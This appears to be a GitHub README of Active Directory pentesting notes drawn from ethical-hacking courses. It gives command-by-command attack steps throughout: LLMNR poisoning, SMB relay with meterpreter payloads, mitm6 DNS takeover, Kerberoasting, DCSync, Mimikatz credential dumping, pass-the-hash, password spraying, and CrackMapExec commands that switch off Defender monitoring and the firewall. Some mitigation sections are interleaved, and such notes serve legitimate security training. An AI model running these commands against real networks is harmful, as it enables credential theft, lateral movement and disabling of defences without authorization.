<div align="center">
<h1> AD-Pentesting-Notes :nepal: </h1>
<a href="https://twitter.com/nirajkharel7" ><img src="https://img.shields.io/twitter/follow/nirajkharel7?style=social" /> </a>
</div>


**AD Basics**
- Domains
  - Domains are used to group and manage objects in an organization
  - An administrative boundary for applying policies to groups of objects
  - An authentication and authorization boundary that provides a way to limit the scope of access to resources
- Trees
  - A domain tree is a hierarchy of domains in AD DS
  - All domains in the tree:
    - Share a contiguous namespace with the parent domain
    - Can have additional child domains
    - By default create a two-way transitive trust with other domains

- Forests
  - A forest is a collection of one or more domain trees
  - Forests
    - Share a common schema
    - Share a common configuration partition
    - Share a common global catalog to enable searching
    - Enable trusts between all domains in the forest
    - Share the Enterprise Admins and Schema Admins groups

- Organizational Unit (OU)
  - OUs are Active Directory containers that can contain users, groups, computers and other OUs.
  - OUs are used to:
    - Represent your organization hierarchically and logically
    - Manage a collection of objects in consistent way
    - Delegate permissions to administer groups of objects
    - Apply policies

- Trusts
  - Trusts provide a mechanism for users to gain access to resources in another domain
  - Types of Trusts
    - Directional: The trust direction flows from trusting domain to the trusted domain
    - Transitive : The trust relationship is extended beyond a two-domain trust include other trusted domains.
  - All domains in a forest trust all domains in the forest
  - Trusts can extend outside the forest

- Objects
  - User : Enables network resource access for a user
  - InetOrgPerson : Similar to a user account, Used for compatibility with other directory services
  - Contacts : Used primirily to assign e-mail addresses to external users, DOes not enable network access
  - Groups : Used to simplify the administration of access control
  - Computers : Enables authentication and auditing of computer access to resources
  - Printers : Used to simplify the process of locating and connectnig to printers
  - Shared folders : Enable users to search for shared folders based on properties
  
- A domain controller is a server with AD DS server role installed that has specifically been promoted to domain controller.
  - Host a copy of the AD DS directory store
  - Provide authentication and authorization services
  - Replicate updates to other domain controls in domain and forest
  - Allow administrative access to manage user accounts and network resources
- A AD DS (Active Directory Domain Service) data store contains the databbase file and processes that store and manage directory information for users, services and applications.
  - Consists of the Ntds.dit file
  - Is stored by default in the `%SystemRoot%\NTDS` folder on all domain controllers.
  - Is accessible only through the domain controller processes and protocols.
  - `If a AD DS is compromised, an attacker can get all the password hashes of the users in that domain.` <br><br>
- Logical AD Components
  - The AD DS Schema
    - Defines every type of object that can be stored in the directory
    - Enforces rules regarding object creation and configuration
    - Class Object : User, Computer
    - Attribute Object : Display name
  
**Network Enumeration - NMAP** <br>
  - Enumerate Ports
  - `nmap -Pn -p- IP -vv -oA nmap/all-ports`
  - Extract Ports
  - `cat nmap/all-ports.nmap | awk -F/ '/open/ {b=b","$1} END {print substr(b,2)}'`
  - Enumerate Services
  - `nmap --Pn sC -sV -oA nmap/services -p(ports) IP --script=vuln -vv`
  - Domain Controller might have port opened like `53,88,135,139,389,445,464,593,636,3268,3269,3389`
  - Note Down the Full Qualified Domain Name, DNS Domain Name, DNS Computer Name and Computer Name with their IP and open ports.
  - Fully Qualified Domain Name: A fully qualified domain name (FQDN) is the complete domain name for a specific computer, or host, on the internet. The FQDN consists of two parts: the hostname and the domain name. For example, an FQDN for a hypothetical mail server might be mymail.somecollege.edu. <br> <br>

**Network Enumeration - SMB**
  - List all SMB related script on NMAP. `ls /usr/share/nmap/scripts/ | grep smb`
  - `nmap -Pn --script smb-enum* -p139,445 IP | tee smb-enumeration`
  - `nmap -Pn --script smb-vuln* -p139,445 IP | tee smb-vulnerabilities`

  - SMB Enumerations with smbmap : `smbmap -H IP`
  - Recursive Lookup with smbmap : `smbmap -R <Foldername> -H IP`
  - Authenticated Enumeration with smbmap : `smbmap -H IP -d <domainname> -u <username> -p <password>`

  - SMB Enumerations with smbclient : `smbclient -L IP`
    - Try to access the drive : `smbclient //IP/DriveName`
    - With Authentication : `smbclient //IP/DriveName -U htb.local\\username%password`  <br><br>
   
  
**Domain Enumeration - ldapsearch**
- View the naming contexts
- `ldapsearch -x -H ldap://10.129.95.154 -s base namingcontexts`
- [ldapsearch]() is a domain enumeration tool which opens a connection to an LDAP server, binds, and performs a search using specified parameters.
- `ldapsearch -x -b "dc=htb,dc=local" -h <IP> -p <port>`
- The -x flag is used to specify anonymous authentication, while the -b flag denotes tha basedn to start from.
- Dump only the users using ldapsearch
- `ldapsearch -x -b "dc=htb,dc=local" -h <IP> -p 389 '(ObjectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}'`
- Dump only the service accounts
- `ldapsearch -x -b "dc=htb,dc=local" -h <IP> -p 389 | grep -i -a 'Service Accounts'`
- Dump usersnames
- `ldapsearch -H ldap://search.htb -x -D 'username@search.htb' -w "passwords" -b "DC=search,DC=htb" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F":" '{print $2}'`

**Domain Enumeration - rpcclient**
- RPC is a Remote Procedure call (protocol) that the program can use to request a service from a program which is located on another computer on the network without having to understand the network details
- Rpcclient reqires credentials to access but in some cases Anonymous access is allowed.
- Connect to target domain controller without authentication
 - `rpcclient -U=" " -N <dc-ip>` : Press enter on the password section.
- Connect to target domain controller with authentication
 - `rpcclient -U="username" <dc-ip>` : Enter password on the password section
- List the commands : `help`
- Get server information : `srvinfo`
- Enumerate the usernames : `enumdomusers`
- Query the particular users : `queryuser <username>`
- List out password policy of the particular user. For this we ned the `rid` of that particular user which can be gained by above query
 - `getuserdompwinfo <rid>`
- Lookup names command which can be used to lookup usernames on the domain controller. It can also be used for extracting their SID.
 - `lookupnames <username>`
- Create Domain Users
 - `createdomuser <username>`
- Delete Domain Users
 - `deletedomuser <usrname>` 
- Enumerate Domains
 - `enumdomains`
- Enumerate Domain Groups
 - `enumdomaingroups`
- Query Domain Groups : You will need a rid for this which can be gained by above command.
 - `querygroup <rid>`
- Query the display information about all the usrs in a domain controller
 - `querydispinfo`
- Enumeate the SMB shares
 - `netshareenum`
- Enumerate the privileges : `enumprivs`


**Domain Enumeration - windapsearch**
- [windapsearch](https://github.com/ropnop/windapsearch) is a python script to enumerate users, groups and computers from windows domain through LDAP.
- Enumerate Users without credentials
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -U | tee windapsearch-enumeration-users`
- Enumerate Users with credentials
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -U | tee winapsearch-authenticated-enumerations`
- Enumerate Groups with credentials
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" -G | tee winapsearch-authentication-group-enumerations`
- Enumerate unconstrained computers
  - `python3 windapsearch -d <Domain Name> --dc-ip <Domain Controller IP> -u "domain\\username" -p "password" --unconstrained-computers | tee unconstrained-computers-enumeration`
  - Unconstrained means that the computer is going to be able to impersonate anybody, if they have the hases for that. We can have the domain admin connected to these unconstrained comupter from there we can impersonate that as the domain admin.<br><br>

**Domain Enumeration - LdapDomainDump**
- [LdapDomainDump](https://github.com/dirkjanm/ldapdomaindump) is a tool to enumerate users, groups and computers. A better tool than windapsearch.
- `python3 ldapdomaindump.py --user "domain\\user" -p "password" ldap://DomainControllerIP:389 --no-json --no-grep -o output`
- The result can be seen on output directory. Make a output directory before running the above commands.
- Visualizing dump with a pretty output like enum4linux
- `ldapdomaindump --user "search.htb\user" -p "password" ldap://search.htb:389 -o output`
- `ldd2pretty --directory output`  <br><br>

**Domain Enumeration - Enumerating with Enum4Linux**
- Use cases
  - RID cycling (when RestrictAnonyomous is set to 1 on Windows 2000) 
  - User Listing (when RestrictAnonymous is set to 0 on Windows 2000)
  - Listing of group memebership information.
  - Share enumeration
  - Detecting if host in a workgroup or domain
  - Identifying the remote operating system
  - Password policy retrieval (using polenum)
- The Do Everything option
  - `enum4linux -a <IP>`. Here the IP is Domain Controller
- The Do Everything option with authentication
  - `enum4linux -u username -p password -a <IP>`
- List of usernames
  - `enum4linux -U <IP>`
- List of usernames with authentication
  - `enum4linux -u username -p password -U <IP>`
- Group Membership
  - `enum4linux -G IP`
- Group nbtstat Information
  - `enum4linux -n IP`
- Listing Windows shares
  - `enum4linux -S IP`
- Getting Printer Information
  - `enum4linux -i iP`
- Note down the Domain info like domain names, users and passwords, domain sid <br><br>

**Generate  usernames from first name and last name**
```bash
curl https://gist.githubusercontent.com/dzmitry-savitski/65c249051e54a8a4f17a534d311ab3d4/raw/5514e8b23e52cac8534cc3fdfbeb61cbb351411c/user-name-rules.txt >> /etc/john/john.conf
john --wordlist=fullnames.txt --rules=Login-Generator-i --stdout > usernames.txt
```
**Domain Enumeration: Enumerate users with Kerbrute**
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.129 -d search.htb ~/htb/search/usernames.txt
```

**Domain Enumeration NMAP Users**
- Using LDAP
  - `nmap -p389 --script ldap-search --script-args 'ldap.username="cn=ippsec,cn=users,dc=pentesting,dc=local",ldap.password=Password12345,ldap.qfilter=users,ldap.attrib=sAMAccountName' <IP> -Pn -oA nmap/domain-users`
  - Where domain name = pentestig.local, username=ippsec, password=Password12345.
  - It will list all the available users on the domain.
  - For enumerating groups, change `cn=users` to `cn=groups` and `ldap.qfilter=users` to `ldap.qfilter=groups` from the above commands<br><br>
- Using Kerberos
  - `nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='pentesting.local' <IP> -Pn` -> Anonymous enumeration <br><br>
  
**Domain Enumeration GetADUsers.py**
- A python script developed by impacket to enumerate the domain users. [Download](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py)
- `python3 GetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50`
- Where pentesting.local is domain name, ippsec and Password12345 is a credentials for domain controller 192.168.10.50
- Other tools developed my impacket [here](https://github.com/SecureAuthCorp/impacket/tree/master/examples).

- Find Delegations : AD delegation is critical part of security and compliance. By delegating control over active directory, you can grant users or groups the permissions they need without adding users to privileged groups like Domain Admins and Account Operators.
  - `python3 findDelegation.py -dc-ip 192.168.1.50 pentesting.local/ippsec:Password12345` - Download file from [here](https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py). <br><br>

**LLMNR Poisoning**
- LLMNR : Link Local Multicast Name Resolution (LLMNR) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link.
- Used to identify when DNS fils to do so.
- Previously NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to
- LLMNR Posioning is performed through a tool called [Responder](https://github.com/SpiderLabs/Responder). Responder a tool to run first thing in the morning when users gets connected to the network, or after launch time.
- Syntax : `python Responder.py -I <interface> -rdw`
- Once the event is triggered, Responder will capture victim's IP address, username and NTLMv2 Hash <br><br>

**Capturing NTLMv2 Hashes with Responder**
- `responder -I eth0 -rdwv | tee responderHash.txt` <br><br>

**Password Cracking with Hashcat**
- [Hashcat](https://github.com/hashcat/hashcat) is a tool utilized to crack hashes on different modules
- Copy the hashes collected from the responder. Example
- `echo "admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030" > hash.txt`
- `hashcat -m 5600 hash.txt /path/to/wordlist.txt`
- Where m is a module and 5600 is a module for NTLMv2 <br><br>

**LLMNR Poisoning Defense**
- Disable LLMNR and NBT-NS
  - To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.
  - To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over ICP/IP"
- If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
  - Require Network Access Control. Example, MAC binding or switchport mode security so that an attacker device cannot connect into the network.
  - Require strong user passwords (e.g., > 14 characters in length and limit common usage).<br><br>
  
**SMB Relay Overview**
- Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access
- Requirements
  - SMB signing must be disabled on the target
  - Replayed user credentials must be admin on machine
    - Grab the NTLM hash from one machine and relay that NTLM hash to another machine as specified on ntlmrelayx. Therefore at least two machine should be there to perform relay
- Step 1
  - Discover Hosts with SMB Signing Disabled
    - `nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24`
    - If the result is Message signing enabled but not required, then we can perform attack as well.
- Step 2
  - Add the IPs with SMB signing disabled on targets.txt file.
- Step 3
  - Open the responder configuration file and turn off the SMB and HTTP. `vim /usr/share/responder/Responder.conf` or `vim /etc/responder/Responder.conf`
  - We will be listening but not going to be responding
- Step 4
  - Run Responder : `python Responder.py -I eth0 -rdwv`
- Step 5
  - Run [NTLMrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py). `python ntlmrelayx.py -tf targets.txt -smb2support`
  - It takes the relay and passes it to the target file that you specify. -smb2support : incorporate anything with SMB too.
  - Wait until an event triggers
- Step 6 : Win
  - It relays the credentials that it captures to this other machine. It will list the SAM files (same as /etc/shadow file on Linux)
  - We can crack those hashes to get the passwords or we can pass those hashes to get access to other machines as well.
- Step 7 : Post Exploitation
  - Run responder as before
  - Run NTLMRelayx in interactive mode
    - `python ntlmrelayx.py -tf targets.txt -smb2support -i` 
  - Setup a listener
    - `nc 127.0.0.1 <portnumber>` Port number can be gained from the result from ntlmrelayx
    - `help` : Here we gained the SMB shell
    - List shares : `shares`
    - `Use C$`
    - `ls`
    - We can have a full access on the computer like we can add file, read file
  - We can also setup a meterpreter listener
    - `python ntlmrelayx.py -tf targets.txt -smb2support -e test.exe` where test.exe is a meterpreter payload (executable)
  - Executes some specifc commands
    - `python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"` 
  - Getting a shell with [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
    - `python3 psexec.py marvel.local/fcastle:Password1@192.168.57.141` <br><br>

**Defending SMB relay**
- Enable SMB Signing on all devices (Best solution)
  - Pro : Completely stops the attack
  - Con : Can cause performance issues with file copies
- Disable NTLM authentication on network
  - Pro : Completely stops the attack
  - Con : If Kerberos stops working, Windows defaults back to NTLM
- Account tiering:
  - Pro : Limits domain admins to specific taks (e.g. only log onto servers with need for DA)
  - Con : Enforcing the policy may be difficult
- Local admin restriction (Best solution)
  - Pro : Can prevent a lot of lateral movement
  - Con : Potential increase in the amount of service desk tickets <br><br>
 
**IPv6 Attacks**
- DNS takeover attack via IPv6
- It is another form of relaying attacks but its so much reliable because it utilizes IPv6.
- Mostly IPv6 is turned on but only IPv4 is utilized.
- If IPv4 is utilized, who's doing DNS for IPv6 and DNS in IPv6 lacks on most of the computers.
- An attacker can setup a machine and listen for all the IPv6 messages that come through. (I AM YOUR DNS)
- We can also get authentication to the Domain Controller when this happens
- We can perform this attack with [mitm6](https://github.com/dirkjanm/mitm6)

**IPv6 DNS Takeover via mitm6**
- `mitm6 -d marvel.local` Keep this running
- Setup a relay attack `ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme`
- Where -6 is for IPv6, 192.168.57.140 is a domain controller and -l for loot to grab more information
- Scenario : IPv6 is sending out a reply and its saying who's got my DNS and it sends it out every 30 minutes
- More Details about [mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- More Details about [Combining NTLM Relays and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) <br><br>

**IPv6 Attack Defense**
- IPv6 poisoning abuses the fact that Windows queries for an IPv6 adress even in IPv4-only environments. If you don't us IPv6 internaly, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
  - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
  - (Ibound) Core Networking - ROuter Advertisement (ICMPv6-In)
  - (Oubound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)
- If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
- Relaying to LDAP and LDAPS can only be mitigated by enabling LDAP signing and LDAP channel binding.
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that use via delegation.<br><br>

**GetNPUsers & Kerberos Pre-Auth**
- List down the users which have Kerberos Pre-Authentication disabled.
- `python3 getnpusers.py htb.local/ -dc-ip 192.168.170.115`
- Grab the HASH of the listed users
- `python3 getnpusers.py htb.local/ dc-ip 192.168.170.115 -request`
- With authentication
- `impacket-GetNPUsers 'search.htb/user:password' -usersfile usernames.txt -dc-ip 'search.htb'`


**AD Post Compromise Enumeration**
- Domain Enumeration with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
  - Powerview is a tool that allows us to look at the network and look at enumerate basically the Domain Controller, Domain Policy, Users group etc.
  - Download the powerview script from above.
  - `powershell -ep bypass`
  - Where, bypass is an execution policy and this removes the blockade of script exection.
  - Run the program `.  .\PoweView.ps1`
  - Get Domain Infomation `Get-NetDomain`
  - Get Specific Domain Controllers - `Get-NetDomainController`
  - Get Domain Policy - `Get-DomainPolicy`
  - Get Specific policy like system access - `(Get-DomainPolicy)."system access"`
  - Get the users - `Get-NetUser`
  - Get the list of users - `Get-NetUser | select cn`
  - Get Domain ADmins - `Get-NetGroup -GroupName "Domain Admins"`
  - List all the files being shared on the network - `Invoke-ShareFinder`
  - [Powerview cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- Bloodhound Overwiew and Setup
  - `sudo apt install bloodhound`
  - It runs on a tool called neo4j
  - `neo4j console` - Create a new password.
  - `bloodhound`
- Grabbing Data with Invoke-Bloodhound
  - Download the [sharphound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) script.
  - Move the file on compromised victim PC.
  - Enable execution `powershell -ep bypass`
  - Execute the script `. .\SharpHound.ps1`
  - Run the script `Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip`
  - All the data are collected on the zip file.
  - Move the file on an attacker machine.
  - Click on the upload data and upload the zip file

**AD Post Compromise Attacks**
- Pass the Hash/Password Overview
  - If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks.
  - Pass the Password : `crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`
- Dumping Hashes with [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
  - It is also a part of impacket tools
  - `secretsdump.py marvel/fcastle:Password1@192.168.57.141`
  - It dumps SAM hashes, DP API Key as well as LSA secrets
  - If there is a password reuse, the last bit of the hash will be the same
- Cracking NTLM Hashes with Hashcat
  - `hashcat -m 1000 hashes.txt wordlist.txt -O`
- Pass the Hash Attacks
  - Pass the Hash, Capture the last bit of the hash with psexec hashdump : `crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local`
- Pass Attacks Mitigation
  - Hard to completely prevent, but we can make it more difficult to an attacker.
  - Limit account re-use
    - Avoid re-using local admin password
    - Disable Guest and Administrator accounts
    - Limit who is a local administrator (least privilege)
  - Utilize strong passwords
    - The longer the better (>14 characters)
    - Avoid using common words
    - I like long sentences
  - Privilege Access Management (PAM)
    - Check out/in sensitive accounts when needed.
    - Automatically rotate passwords on check out and check in
    - Limits pass attacks as hash/password is strong and constantly rotated.

**Token Impersonation Overview**
- Tokens : Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
- Types
  - Delegate : Created for logging into a machine or using Remote Desktop
  - Impersonate : "non-interactive" such as attaching a network drive or a domain logon script

**Token Impersonation with Incognito**
  - `msfconsole`
  - `use exploit/windows/smb/psexec`
  - `set RHOSTS, SMBDomain, SMBPass and SMB User`
  - `show targets` : Choose Native Upload
  - `set target 2`
  - `set payload windows/x64/meterpreter/reverse_tcp`
  - `set lhost eth0`
  - `run`
- Meterpreter session will be created. We can load incognito from meterpreter shell.
  - `load incognito`
  - `help` - It will show incognito command
  - `list_tokens -u` : List the tokens, we can impersonate the listed users.
  - `impersonate_token marvel\\administrator`
  - `shell`
  - `whoami`

**Mitigation Strategies**
- Limit user/group token creation permissions
- Account tiering : Domain Administrator should login into the machines that they need to access which should only be domain controllers. If for some reasons that domain administrator logs into a user computer or a server and that user computer or server gets compromised. We can impersonate that token if we can compromised the domain controller.
- Local admin restriction : If users are not local admins on their computers we cannot get a shell on that computer with their account that prevents us from gettig onto the computer and utilizing this kind of attack.


**Kerberos Overview**
- Kerberos is a network authentication protocol used in Windows Active Directory.
- In this process, Clients connect and interact with the network authentication service, the client obtains tickets from the Key Distribution Center (KDC), After obtaining the ticket from the KDC, A client may use the ticket in order to communicate with the Application Servers.
- Kerberos runs on Port 88 (UDP) by default.
- Some terms to be cleared:
  - Client : A normal user who wants to access a service.
  - Key Distribution Center (KDC) : The most important component which plays the main role in the Authentication Process.
  - Application Server : Any Application Service such as SQL
  - TGT (Ticket Granting Ticket) : Ticket needed for requesting TGS from KDC, it is obtained from the KDC only.
  - TGS (Ticket Granting Service) : Ticket needed for authenticating against a particular service which is server account hash.
  - SPN (Service Principle Name) : SPN is an identifier for each service instance, it is one of the key components in the process of authentication.

  **Kerberoasting Attack**
  - Kerberoasting is an attack where an attacker can steal the Kerberos TGS Ticket which is encrypted.
  - The attacker can then attempt to crack it offline. The Kerberos uses a NTLM Hash in order to encrypt KRB_TGS of that service.
  - Whenn the domain user sent a request for TGS ticket to KDC for any service that has registered SPN, the KDC generates the KRB_TGS without identifying the user authorization against the requested service.
- Step 1 : Get SPNs, Dump Hash
	- `python3 GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request`
	- Step 2 : Crack that hash
		- `hashcat -m 13100 hash.txt wordlist.txt`
- Step 2 : There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. If such we can perform the attack without password.
 - `python3 GetUserSPNs.py <DOMAIN/username> -dc-ip <IP> -request -no-pass`
- If there are multiple users which needed to be tried without password then,
 - `for i in $(cat users.txt); do python3 GetNPUsers.py htb.local/$i -dc-ip 10.129.129.128 -no-pass -request; done`

**Mitigation Strategies**
- Strong Passwords
- Least Privilege : Do not make your domain accounts or service accounts your domain administrators.

**GPP /cPassword Attacks**
- Group Policy Preferencecs allowed admins to create policies using embedded credentials.
- These credentials were encrypted and placed in a "cPassword"
- The key was accidently released
- Patched in MS14-025, but doesn't prevent previous uses.
- Group Policies are stored in SYSVOL on the domain controller, any domain user can read the policy and therefore decrypt the stored passwords.
- The GPP or  cpassword is stored on the Groups.xml file
- Decrypt GPP : `gpp-decrypt <hash>`

**DC Sync Attack**
- A DC Sync Attack uses commands in Active Directory Replication Service Remote Protocol (MS-DRSR) to pretend to be a domain controller (DC) in order to get user credentials from another DC.
- We need permission to actually replicate AD information. By default domain controllers have this permission called `Replicating Directory Changes` and `Replicating Directory Changes All`. These two permissions are needed to perform DC Sync attack.
- The most common way to getting those permissions is to abuse the Microsoft Exchange Windows Permission Group. It is Microsoft's email server service and and integrates with Active Directory. AD grants that grup permission to modify permissions on the root of the domain. So if we get into that group we can abuse it to perform an attack.
- It means that the credential you are using for this attach should be on that group.
- `python3 secretsdump.py` htb.local/username:pasword@pc1.htb.local`
- where pc1 is a machine name.
- Use the acquired hash to perform pass the hash attack.


**Mimikatz Overview**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) is a tool used to view and steal credentials, generate Kerberos tickets, and levarage attacks.
- Dumps credentials stored in memory.
- Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
- The different  modules mimikatz uses are explained on its [wiki](https://github.com/gentilkiwi/mimikatz/wiki)

**Credential Dumping with Mimikatz**
- Download the binary file into the compromised machine.
- Open a CMD, navigate to the downloaded folder and execute the exe file. ./mimikatz.exe
- Run the debug mode : `privilege::debug` . The debug means that it's allowing us to debug a process that we wouldn't otherwise have access to. Example: Dump information out of memory.
- Dump the logon password.
	- `sekurlsa::logonpassword`
- Dump the SAM hashes
	- `lsadump::sam`
- Dump the LSA
	- `lsadump::lsa /patch`
	
**SwisArmy CrackMapExec Intro**
- A post exploitation tool that helps automate assessing the security of large Active Directory Networks
- Available Protocols : ldap, mssql, smb, ssh, winrm <br> <br>

**CrackMapExec Password Policy Checkup**
- Before performing brute force attack using crackmapexec, it is always handful to analyze its password policy, so that we do not logout the users from their computer. It also helps on [generating password](https://github.com/nirajkharel/PasswordCracking/blob/main/README.md) as well.
- `crackmapexec smb IP --pass-pol -u '' -p ''`


**SwisArmy CrackMapExec Password Spraying**
- Spray credentials to IP range
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --no-bruteforce`
  - It will also show if we have an admin access, if it has a admin access, it will show (Pwn3d!) message.
- Spray different users and password combination
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u usernames.txt -p passwords.txt --no-bruteforce`
- Spray Hashes to IP range
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -H hashes.txt --no-bruteforce`
- By default CrackMapExec exit after a successfull login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. <br><br>

**SwisArmy CrackMapExec ENUM 1**
- Use smb modules to do some enumeration for the shares
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --shares`
  - It will provide the share name, permissions and remarks
  - We can follow the result gained by it using SMBCLIENT to access the shares after this.
- Sessions
  - Take a look at a sesions and see if they is any sessions going on which we have access.
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --sessions`
- Enumerate Disks
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --disks`
- Logged on Users
  - See if we have any logged on users in the network
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
  - If we are a local admin, but we might not be a domain admin, if the logged on users are domain admin we will be able to dump the hashes and can perform Pass The Hash attack and get a sessions.
- Get all users
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --users` <br><br>

**SwisArmy CrackMapExec ENUM 2**
- Enumerate RID : Relative Identifier (RID) is a variable length number that is assigned to objects at creation and becomes part of the Objet's Security Identifier (SID) that uniquely identifies an account or group within a domain. Domain SID is same on a same domain but RID is different per object. Windows creates a RID by default in Active Directory. Example, RID 501 for administrator, 502 for default and 503 for guest account.
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute` It will also show which are group, users, alias.
- Enumerate Password Policy
  - `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --pass-pol` <br> <br>

**SiwsArmy CrackMapExec Command Execution**
-  `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'whoami'`
-  Where 192.168.1.54 have a local domain access, -x is a commandline, -X powershell script or command line.
-  `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'whoami'`
-  Verify local admin access
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'whoami /groups'`
  - If it is a part of BUILTIN\Administrator, it has local admin access on the machine.
  - Giving local admin access means giving them full control over the local computer.
- Get Computer Status : like antivirus status, protections, real time protection.
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Get-MpComputerstatus`
- If we are a domain admin, we can disable such things.
- Disable Monitoring
  - `crackmapexc winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Set-MpPreference -DisableRealtimeMonitoring $true`
- Disable Antivirus
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Set-MpPreference -DisableIOAVProtection $true`
- Verify if these are disabled or not
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Get-MpComputerstatus'`
- View all profiles, public private, firewalls
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'netsh advfirewall show allprofiles'`
  - If they are enabled, disable with
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'netsh advfirewall set allprofiles state off'`
- Enumerate Directories
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'dir C:\Users\ippsec'`  
- Read Files
  - `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'type C:\Users\ippsec\users.txt'`

### References
- [TCM Security - Heath Adams](https://academy.tcm-sec.com) (Most of the contents)
- [Top Five Ways I Got Domain on Your Internal Network Before Launch By Adam Toscher.](https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
- [Practical Ethical Hacking By TCM Security.](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)
- [Active Directory Pentesting - Red Team By I.T & Security.](https://www.youtube.com/watch?v=gSpQMzINB6U&list=PLziMzyAZFGMf8rGjtpV6gYbx5hozUNeSZ)
- https://www.youtube.com/watch?v=ajOr4pcx6T0
- https://medium.com/@Shorty420/kerberoasting-9108477279cc
- https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
- https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
- https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
